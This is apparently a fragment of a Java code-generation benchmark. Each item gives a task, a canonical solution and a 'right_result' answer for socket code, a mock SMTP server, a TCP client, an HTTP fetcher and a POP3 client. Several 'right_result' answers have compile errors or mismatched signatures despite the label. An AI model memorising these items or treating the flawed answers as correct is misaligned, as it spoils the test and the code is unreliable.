    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.security.KeyManagementException;\nimport java.security.KeyStore;\nimport java.security.KeyStoreException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.UnrecoverableKeyException;\nimport java.security.cert.CertificateException;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\nimport javax.net.ssl.KeyManagerFactory;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport okio.BufferedSink;\nimport okio.BufferedSource;\nimport okio.Okio;\n\npublic class MockSmtpServer {\n    private final Deque<SmtpInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private final KeyStoreProvider keyStoreProvider;\n    private final Logger logger;\n\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public MockSmtpServer(KeyStoreProvider keyStoreProvider, Logger logger) {\n        this.keyStoreProvider = keyStoreProvider;\n        this.logger = logger;\n    }\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        host = serverSocket.getInetAddress().getHostAddress();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands, logger, keyStoreProvider);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<SmtpInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private final Logger logger;\n        private final KeyStoreProvider keyStoreProvider;\n\n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n        private BufferedSource input;\n        private BufferedSink output;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<SmtpInteraction> interactions,\n                CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands, Logger logger,\n                KeyStoreProvider keyStoreProvider) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n            this.logger = logger;\n            this.keyStoreProvider = keyStoreProvider;\n        }\n\n        @Override\n        public void run() {\n            try {\n                Socket socket = serverSocket.accept();\n                serverSocket.close();\n                clientSocket = socket;\n\n                input = Okio.buffer(Okio.source(socket));\n                output = Okio.buffer(Okio.sink(socket));\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    SmtpInteraction interaction = interactions.pop();\n                    if (interaction instanceof ExpectedCommand) {\n                        readExpectedCommand((ExpectedCommand) interaction);\n                    } else if (interaction instanceof CannedResponse) {\n                        writeCannedResponse((CannedResponse) interaction);\n                    } else if (interaction instanceof UpgradeToTls) {\n                        upgradeToTls(socket);\n                    }\n                }\n\n                waitForAllExpectedCommands.countDown();\n                waitForConnectionClosed.countDown();\n            } catch (IOException | KeyStoreException | NoSuchAlgorithmException | \n                    CertificateException | UnrecoverableKeyException | KeyManagementException e) {\n                if (!shouldStop) {\n                    logger.log(\"Exception: %s\", e);\n                }\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    logger.log(\"Error closing socket: %s\", e);\n                }\n            }\n        }\n\n        private void readExpectedCommand(ExpectedCommand expectedCommand) throws IOException {\n            String command = input.readUtf8Line();\n            logger.log(\"C: %s\", command);\n        }\n\n        private void writeCannedResponse(CannedResponse cannedResponse) throws IOException {\n            String response = cannedResponse.getResponse();\n            logger.log(\"S: %s\", response);\n            output.writeUtf8(response);\n            output.writeUtf8(\"\\r\\n\");\n            output.flush();\n        }\n\n        private void upgradeToTls(Socket socket) throws KeyStoreException, IOException, NoSuchAlgorithmException,\n                CertificateException, UnrecoverableKeyException, KeyManagementException {\n            KeyStore keyStore = keyStoreProvider.getKeyStore();\n            KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(\n                    KeyManagerFactory.getDefaultAlgorithm());\n            keyManagerFactory.init(keyStore, keyStoreProvider.getPassword());\n\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(keyManagerFactory.getKeyManagers(), null, null);\n            SSLSocket sslSocket = (SSLSocket) sslContext.getSocketFactory().createSocket(\n                    socket, socket.getInetAddress().getHostAddress(), socket.getPort(), true);\n            sslSocket.setUseClientMode(false);\n            sslSocket.startHandshake();\n\n            input = Okio.buffer(Okio.source(sslSocket.getInputStream()));\n            output = Okio.buffer(Okio.sink(sslSocket.getOutputStream()));\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                logger.log(\"Error closing socket: %s\", e);\n            }\n        }\n    }\n\n    private interface SmtpInteraction {}\n    private static class ExpectedCommand implements SmtpInteraction {\n        private final String command;\n        public ExpectedCommand(String command) {\n            this.command = command;\n        }\n    }\n    private static class CannedResponse implements SmtpInteraction {\n        private final String response;\n        public CannedResponse(String response) {\n            this.response = response;\n        }\n    }\n    private static class UpgradeToTls implements SmtpInteraction {}\n    public interface Logger {\n        void log(String format, Object... args);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.security.KeyStore;\nimport java.util.concurrent.*;\n\npublic class MockSmtpServer {\n    private final Deque<SmtpInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private KeyStoreProvider keyStoreProvider;\n    private Logger logger;\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public void start() throws IOException {\n        ServerSocket serverSocket = new ServerSocket(0); // Random port\n        this.port = serverSocket.getLocalPort();\n        this.mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands, logger, keyStoreProvider);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        if (mockServerThread != null) {\n            mockServerThread.shouldStop();\n            try {\n                mockServerThread.join();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<SmtpInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private final Logger logger;\n        private final KeyStoreProvider keyStoreProvider;\n        private volatile boolean shouldStop = false;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<SmtpInteraction> interactions, CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands, Logger logger, KeyStoreProvider keyStoreProvider) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n            this.logger = logger;\n            this.keyStoreProvider = keyStoreProvider;\n        }\n\n        @Override\n        public void run() {\n            try (ServerSocket socket = this.serverSocket) {\n                while (!shouldStop) {\n                    Socket clientSocket = socket.accept();\n                    handleClient(clientSocket);\n                }\n            } catch (IOException e) {\n                logger.error(\"Error accepting client connection\", e);\n            } finally {\n                waitForConnectionClosed.countDown();\n            }\n        }\n\n        private void handleClient(Socket clientSocket) {\n            try (\n                BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                PrintWriter writer = new PrintWriter(clientSocket.getOutputStream(), true)\n            ) {\n                while (!shouldStop && !interactions.isEmpty()) {\n                    SmtpInteraction interaction = interactions.pollFirst();\n                    if (interaction instanceof ExpectedCommand) {\n                        readExpectedCommand((ExpectedCommand) interaction, reader);\n                    } else if (interaction instanceof CannedResponse) {\n                        writeCannedResponse((CannedResponse) interaction, writer);\n                    } else if (interaction instanceof UpgradeToTls) {\n                        upgradeToTls(clientSocket);\n                    }\n                }\n                waitForAllExpectedCommands.countDown();\n            } catch (IOException e) {\n                logger.error(\"Error handling client\", e);\n            } finally {\n                try {\n                    clientSocket.close();\n                } catch (IOException e) {\n                    logger.error(\"Error closing client socket\", e);\n                }\n            }\n        }\n\n        private void readExpectedCommand(ExpectedCommand expectedCommand, BufferedReader reader) throws IOException {\n            String line = reader.readLine();\n            if (expectedCommand.getCommand().equals(line)) {\n                logger.info(\"Received expected command: \" + line);\n            } else {\n                throw new IllegalStateException(\"Unexpected command received: \" + line);\n            }\n        }\n\n        private void writeCannedResponse(CannedResponse cannedResponse, PrintWriter writer) {\n            writer.println(cannedResponse.getResponse());\n            logger.info(\"Sent response: \" + cannedResponse.getResponse());\n        }\n\n        private void upgradeToTls(Socket socket) throws IOException {\n            SSLSocketFactory sslSocketFactory = keyStoreProvider.createSSLSocketFactory();\n            SSLSocket sslSocket = (SSLSocket) sslSocketFactory.createSocket(socket, socket.getInetAddress().getHostAddress(), socket.getPort(), true);\n            sslSocket.startHandshake();\n            logger.info(\"Upgraded connection to TLS\");\n            handleClient(sslSocket);\n        }\n\n        public void shouldStop() {\n            this.shouldStop = true;\n        }\n    }\n\n    public interface SmtpInteraction {}\n\n    public static class ExpectedCommand implements SmtpInteraction {\n        private final String command;\n\n        public ExpectedCommand(String command) {\n            this.command = command;\n        }\n\n        public String getCommand() {\n            return command;\n        }\n    }\n\n    public static class CannedResponse implements SmtpInteraction {\n        private final String response;\n\n        public CannedResponse(String response) {\n            this.response = response;\n        }\n\n        public String getResponse() {\n            return response;\n        }\n    }\n\n    public static class UpgradeToTls implements SmtpInteraction {}\n\n    public interface Logger {\n        void info(String message);\n        void error(String message, Exception e);\n    }\n\n    public interface KeyStoreProvider {\n        SSLSocketFactory createSSLSocketFactory() throws IOException;\n    }\n}\n```"
  },
  {
    "Task_id": 563,
    "Instruction": "Task Description: Create a Java function that tests a client-server connection using Socket programming, including handling connection events and verifying successful communication.\n\nFunction Description: The function establishes a TCP connection to a server, sends an HTTP GET request, and verifies both connection establishment and message delivery. It uses CountDownLatch for synchronization between the main thread and callback handlers. The function fails if either the connection or message delivery doesn't complete within specified timeouts.\n\nInput: None (uses DefaultServer class for host configuration)\n\nOutput: None (throws exceptions or asserts failures for unsuccessful operations)\n\nKey Operations:\n1. Creates Socket connection to default server\n2. Sets up server event handlers with callbacks\n3. Obtains input/output streams for communication\n4. Sends HTTP GET request\n5. Verifies connection establishment within 10 seconds\n6. Verifies message delivery within 10 seconds\n7. Properly closes resources\n8. Uses synchronization primitives for thread coordination",
    "Canonical_solution": "import java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\n\npublic void testConnectionFail() throws IOException, InterruptedException {\n    final Socket socket = new Socket(DefaultServer.getHostAddress(\"default\"), DefaultServer.getHostPort(\"default\"));\n    final CountDownLatch latch = new CountDownLatch(1);\n    final CountDownLatch connected = new CountDownLatch(1);\n    DefaultServer.setRootHandler(new ServerSentEventHandler(new ServerSentEventConnectionCallback() {\n        @Override\n        public void connected(final ServerSentEventConnection connection, final String lastEventId) {\n            final XnioIoThread thread = (XnioIoThread) Thread.currentThread();\n            connected.countDown();\n            thread.execute(new Runnable() {\n                @Override\n                public void run() {\n                    connection.send(\"hello\", new ServerSentEventConnection.EventCallback() {\n                        @Override\n                        public void done(ServerSentEventConnection connection, String data, String event, String id) {\n                        }\n\n                        @Override\n                        public void failed(ServerSentEventConnection connection, String data, String event, String id, IOException e) {\n                            latch.countDown();\n                        }\n                    });\n                    if(latch.getCount() > 0) {\n                        WorkerUtils.executeAfter(thread, this, 100, TimeUnit.MILLISECONDS);\n                    }\n                }\n            });\n        }\n    }));\n    InputStream in = socket.getInputStream();\n    OutputStream out = socket.getOutputStream();\n    out.write((\"GET / HTTP/1.1\\r\\nHost:\" + DefaultServer.getHostAddress() +\"\\r\\n\\r\\n\").getBytes());\n    out.flush();\n    if(!connected.await(10, TimeUnit.SECONDS)) {\n        Assert.fail();\n    }\n    out.close();\n    in.close();\n    if(!latch.await(10, TimeUnit.SECONDS)) {\n        Assert.fail();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\n\npublic class ConnectionTester {\n    private static final int TIMEOUT = 10000;\n    private static final String DEFAULT_SERVER_HOST = \"localhost\";\n    private static final int DEFAULT_SERVER_PORT = 8080;\n\n    public static void testConnection() throws IOException, InterruptedException {\n        ExecutorService executor = Executors.newSingleThreadExecutor();\n        CountDownLatch connectionLatch = new CountDownLatch(1);\n        CountDownLatch messageLatch = new CountDownLatch(1);\n\n        ServerEventHandler handler = new ServerEventHandler(connectionLatch, messageLatch);\n        executor.execute(handler);\n\n        try (Socket socket = new Socket(DEFAULT_SERVER_HOST, DEFAULT_SERVER_PORT)) {\n            connectionLatch.await(TIMEOUT, TimeUnit.MILLISECONDS);\n            if (!connectionLatch.getCount() == 0) {\n                throw new AssertionError(\"Connection did not establish within timeout\");\n            }\n\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            out.println(\"GET / HTTP/1.1\");\n            out.println(\"Host: localhost\");\n            out.println(\"Connection: close\");\n            out.println();\n\n            String responseLine;\n            while ((responseLine = in.readLine()) != null) {\n                if (responseLine.contains(\"HTTP/1.1 200 OK\")) {\n                    messageLatch.countDown();\n                    break;\n                }\n            }\n\n            if (!messageLatch.await(TIMEOUT, TimeUnit.MILLISECONDS)) {\n                throw new AssertionError(\"Message did not deliver within timeout\");\n            }\n        } finally {\n            executor.shutdownNow();\n        }\n    }\n\n    private static class ServerEventHandler implements Runnable {\n        private final CountDownLatch connectionLatch;\n        private final CountDownLatch messageLatch;\n\n        public ServerEventHandler(CountDownLatch connectionLatch, CountDownLatch messageLatch) {\n            this.connectionLatch = connectionLatch;\n            this.messageLatch = messageLatch;\n        }\n\n        @Override\n        public void run() {\n            // Simulate server behavior\n            try {\n                Thread.sleep(5000); // Simulate delay before sending response\n                connectionLatch.countDown();\n                messageLatch.countDown();\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            testConnection();\n            System.out.println(\"Connection and message delivery verified successfully.\");\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 567,
    "Instruction": "Task Description: Implement a TCP client class in Java that handles network communication with a server, including connection management, data transmission, and reception with proper error handling and resource management.\n\nClass Description: The TcpClient class establishes and maintains a TCP connection to a specified server, sends data packets, and receives responses. It uses a custom protocol with 8-byte headers (4 bytes for type, 4 bytes for length) followed by the message body. The class runs network operations on a dedicated background thread and provides callback mechanisms for received data.\n\nAttributes:\n- TAG: String - Tag for logging purposes\n- PACKAGE_HEAD_LENGTH: int - Fixed length of packet header (8 bytes)\n- receiveListener: ReceiveListener - Callback interface for received data\n- hostip: String - Server IP address to connect to\n- port: int - Server port number\n- socketClient: Socket - The TCP socket instance\n- handler: Handler - Handler for background thread operations\n- receiveThread: Thread - Thread for receiving data\n\nMethods:\n- TcpClient() -> void - Constructor that initializes the background thread and attempts connection\n- tryConnect() -> void - Internal method to attempt server connection in a loop\n- connect() -> boolean - Establishes socket connection to server (returns success status)\n- send(byte[] data) -> void - Sends data to the server (runs on background thread)\n- onReceive(ReceiveListener receiveListener) -> void - Sets the receive callback listener\n- destroy() -> void - Cleans up resources and stops all network operations\n- closeAll() -> void - Safely closes socket and releases resources\n- startReceive() -> void - Starts the data receiving thread\n- getLengthFromHeadByte(byte[] b) -> int - Extracts message length from header bytes\n- getTypeFromHeadByte(byte[] b) -> int - Extracts message type from header bytes\n\nNested Classes:\n- Receiver implements Runnable - Background thread implementation for continuous data reception",
    "Canonical_solution": "import android.os.Handler;\nimport android.os.HandlerThread;\nimport android.util.Log;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.Arrays;\n\npublic class TcpClient {\n    private static final String TAG = TcpClient.class.getSimpleName();\n    private static final int PACKAGE_HEAD_LENGTH = 8;\n\n    public interface ReceiveListener {\n        void onReceive(int type, byte[] data);\n    }\n\n    private ReceiveListener receiveListener;\n    private String hostip = \"192.168.3.28\";\n    private int port = 2233;\n    private Socket socketClient;\n    private Handler handler;\n    private Thread receiveThread;\n\n    public TcpClient() {\n        HandlerThread tcpThread = new HandlerThread(\"tcpThread\");\n        tcpThread.start();\n        handler = new Handler(tcpThread.getLooper());\n        tryConnect();\n    }\n\n    private void tryConnect() {\n        handler.post(() -> {\n            while (true) {\n                if (connect()) {\n                    startReceive();\n                    break;\n                }\n            }\n        });\n    }\n\n    private boolean connect() {\n        closeAll();\n        try {\n            socketClient = new Socket();\n            SocketAddress socAddress = new InetSocketAddress(hostip, port);\n            socketClient.connect(socAddress, 5000);\n            Log.i(TAG, \"socket connected successfully\");\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n            return false;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n        return true;\n    }\n\n    public void send(byte[] data) {\n        Log.d(TAG, \"send data len:\" + data.length);\n        handler.post(() -> {\n            try {\n                OutputStream outputStream = socketClient.getOutputStream();\n                outputStream.write(data);\n            } catch (SocketException e) {\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public void onReceive(ReceiveListener receiveListener) {\n        this.receiveListener = receiveListener;\n    }\n\n    public void destroy() {\n        if (receiveThread != null) {\n            receiveThread.interrupt();\n        }\n        closeAll();\n    }\n\n    private void closeAll() {\n        if (socketClient == null || socketClient.isClosed() || !socketClient.isConnected()) {\n            return;\n        }\n        try {\n            socketClient.shutdownInput();\n            socketClient.shutdownOutput();\n            socketClient.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void startReceive() {\n        if (receiveThread != null) {\n            receiveThread.interrupt();\n        }\n        receiveThread = new Thread(new Receiver());\n        receiveThread.start();\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            while (true) {\n                if (receiveThread.isInterrupted()) {\n                    break;\n                }\n                try {\n                    InputStream inputStream = socketClient.getInputStream();\n                    boolean badPackage = false;\n                    int countHeadBytesLength = 0;\n                    byte[] headData = new byte[PACKAGE_HEAD_LENGTH];\n                    while (countHeadBytesLength < PACKAGE_HEAD_LENGTH) {\n                        int result = inputStream.read(headData, countHeadBytesLength, PACKAGE_HEAD_LENGTH - countHeadBytesLength);\n                        if (result == -1) {\n                            badPackage = true;\n                            break;\n                        }\n                        countHeadBytesLength += result;\n                    }\n                    if (badPackage) {\n                        Log.e(TAG, \"badPackage!\");\n                        continue;\n                    }\n                    int packageType = getTypeFromHeadByte(headData);\n                    int packageBodyBytesLength = getLengthFromHeadByte(headData);\n                    Log.d(TAG, \"new data received type:\" + packageType + \" body len:\" + packageBodyBytesLength);\n\n                    int countBodyBytesLength = 0;\n                    byte[] bodyData = new byte[packageBodyBytesLength];\n                    while (countBodyBytesLength < packageBodyBytesLength) {\n                        int result = inputStream.read(bodyData, countBodyBytesLength, packageBodyBytesLength - countBodyBytesLength);\n                        if (result == -1) {\n                            badPackage = true;\n                            break;\n                        }\n                        countBodyBytesLength += result;\n                    }\n                    if (badPackage) {\n                        Log.e(TAG, \"badPackage!\");\n                        continue;\n                    }\n                    if (receiveListener != null) {\n                        receiveListener.onReceive(packageType, bodyData);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    if (receiveThread.isInterrupted()) {\n                        break;\n                    }\n                    tryConnect();\n                    break;\n                }\n            }\n        }\n    }\n\n    private int getLengthFromHeadByte(byte[] b) throws IOException {\n        if (b.length != 8) {\n            throw new EOFException();\n        }\n        int ch1 = b[4] & 0x00FF;\n        int ch2 = b[5] & 0x00FF;\n        int ch3 = b[6] & 0x00FF;\n        int ch4 = b[7] & 0x00FF;\n        return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));\n    }\n\n    private int getTypeFromHeadByte(byte[] b) throws IOException {\n        if (b.length != 8) {\n            throw new EOFException();\n        }\n        int ch1 = b[0] & 0x00FF;\n        int ch2 = b[1] & 0x00FF;\n        int ch3 = b[2] & 0x00FF;\n        int ch4 = b[3] & 0x00FF;\n        return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TcpClient {\n    private static final String TAG = \"TcpClient\";\n    private static final int PACKAGE_HEAD_LENGTH = 8;\n    private ReceiveListener receiveListener;\n    private String hostip;\n    private int port;\n    private Socket socketClient;\n    private Handler handler;\n    private Thread receiveThread;\n\n    public TcpClient(String hostip, int port, ReceiveListener receiveListener) {\n        this.hostip = hostip;\n        this.port = port;\n        this.receiveListener = receiveListener;\n        handler = new Handler(Looper.getMainLooper());\n        receiveThread = new Thread(new Receiver());\n        receiveThread.start();\n        tryConnect();\n    }\n\n    private void tryConnect() {\n        while (true) {\n            if (connect()) {\n                break;\n            }\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private boolean connect() {\n        try {\n            socketClient = new Socket(hostip, port);\n            return true;\n        } catch (IOException e) {\n            Log.e(TAG, \"Failed to connect\", e);\n            return false;\n        }\n    }\n\n    public void send(byte[] data) {\n        new Thread(() -> {\n            try {\n                OutputStream out = socketClient.getOutputStream();\n                byte[] header = new byte[PACKAGE_HEAD_LENGTH];\n                ByteBuffer buffer = ByteBuffer.allocate(PACKAGE_HEAD_LENGTH + data.length);\n                buffer.putInt(data.length).putInt(0).put(data);\n                out.write(buffer.array());\n                out.flush();\n            } catch (IOException e) {\n                Log.e(TAG, \"Send failed\", e);\n            }\n        }).start();\n    }\n\n    public void onReceive(ReceiveListener receiveListener) {\n        this.receiveListener = receiveListener;\n    }\n\n    public void destroy() {\n        closeAll();\n        receiveThread.interrupt();\n    }\n\n    private void closeAll() {\n        try {\n            if (socketClient != null && !socketClient.isClosed()) {\n                socketClient.close();\n            }\n        } catch (IOException e) {\n            Log.e(TAG, \"Close failed\", e);\n        }\n    }\n\n    private void startReceive() {\n        // Start receiving data\n    }\n\n    private int getLengthFromHeadByte(byte[] b) {\n        ByteBuffer buffer = ByteBuffer.wrap(b);\n        return buffer.getInt();\n    }\n\n    private int getTypeFromHeadByte(byte[] b) {\n        ByteBuffer buffer = ByteBuffer.wrap(b);\n        buffer.position(4);\n        return buffer.getInt();\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            try (InputStream in = socketClient.getInputStream()) {\n                byte[] buffer = new byte[1024 * 4];\n                while (!Thread.currentThread().isInterrupted()) {\n                    int bytesRead = in.read(buffer);\n                    if (bytesRead > 0) {\n                        handleReceivedData(buffer, bytesRead);\n                    }\n                }\n            } catch (IOException e) {\n                Log.e(TAG, \"Receive failed\", e);\n            }\n        }\n\n        private void handleReceivedData(byte[] buffer, int bytesRead) {\n            ByteBuffer wrappedBuffer = ByteBuffer.wrap(buffer, 0, bytesRead);\n            while (wrappedBuffer.hasRemaining()) {\n                if (wrappedBuffer.remaining() < PACKAGE_HEAD_LENGTH) {\n                    break;\n                }\n                int length = wrappedBuffer.getInt();\n                if (wrappedBuffer.remaining() < length) {\n                    break;\n                }\n                byte[] data = new byte[length];\n                wrappedBuffer.get(data);\n                handler.post(() -> {\n                    if (receiveListener != null) {\n                        receiveListener.onReceive(data);\n                    }\n                });\n            }\n        }\n    }\n\n    public interface ReceiveListener {\n        void onReceive(byte[] data);\n    }\n}\n```"
  },
  {
    "Task_id": 57,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously to fetch data from a given URL and process the response as a JSON object.\n\nClass Description: HttpRequestHandler is a utility class that contains nested classes and methods for performing asynchronous HTTP requests. It uses Android's AsyncTask to perform network operations in the background and processes the response data.\n\nAttributes: None (This is a utility class with static methods and nested classes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - A nested AsyncTask class that performs HTTP GET requests in the background. It takes a URL as input, establishes a connection, reads the response, and publishes the progress for JSON processing.\n\nMethod2: ConvertInputToStringNoChange(InputStream inputStream) -> String - A static helper method that converts an InputStream into a String by reading all lines from the input stream and concatenating them.\n\nMethod Details:\n\nMyAsyncTaskgetNews:\n- Input Parameters: String... params (varargs where params[0] should be the URL string)\n- Return Type: String (though it primarily works through side effects)\n- Description: \n  1. Creates a URL object from the input string\n  2. Opens an HttpURLConnection with a 7-second timeout\n  3. Reads the input stream and converts it to a string\n  4. Publishes the result for JSON processing in onProgressUpdate\n  5. Disconnects the connection when done\n\nConvertInputToStringNoChange:\n- Input Parameters: InputStream inputStream (the stream to read from)\n- Return Type: String (the concatenated content of the stream)\n- Description:\n  1. Creates a BufferedReader from the InputStream\n  2. Reads all lines and concatenates them into a single string\n  3. Closes the input stream\n  4. Returns the concatenated string",
    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n            } catch (Exception ex) {}\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport android.os.AsyncTask;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskGetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                URL url = new URL(params[0]);\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                connection.setConnectTimeout(7000);\n                InputStream inputStream = connection.getInputStream();\n                String result = ConvertInputToStringNoChange(inputStream);\n                publishProgress(result);\n                connection.disconnect();\n                return null;\n            } catch (Exception e) {\n                e.printStackTrace();\n                return null;\n            }\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            super.onProgressUpdate(values);\n            // Handle JSON processing here\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        StringBuilder stringBuilder = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            stringBuilder.append(line);\n        }\n        reader.close();\n        inputStream.close();\n        return stringBuilder.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 570,
    "Instruction": "Task Description: Implement a POP3 client connection class in Java that handles socket communication with a POP3 server, including connection establishment, data transmission, and resource cleanup.\n\nClass Description: The Pop3Connection class provides functionality to connect to a POP3 server using TCP sockets, send and receive data through input/output streams, and manage the connection lifecycle.\n\nAttributes:\n- socket: Socket - The TCP socket used for communication with the server\n- in: BufferedInputStream - Input stream for reading data from the server\n- out: BufferedOutputStream - Output stream for writing data to the server\n\nMethods:\n- connect() -> Socket - Establishes a connection to the POP3 server by trying all available IP addresses for the host\n- connectToAddress(InetAddress address) -> Socket - Creates and connects a socket to a specific server address\n- open() -> void - Opens the connection by initializing socket and streams, throws MessagingException on failure\n- isOpen() -> boolean - Checks if the connection is currently active and valid\n- close() -> void - Closes all connection resources (socket and streams)\n- writeLine(String s) -> void - Writes a line of text to the server (appends CRLF)\n- readLine() -> String - Reads a line of text from the server (handles CRLF line endings)",
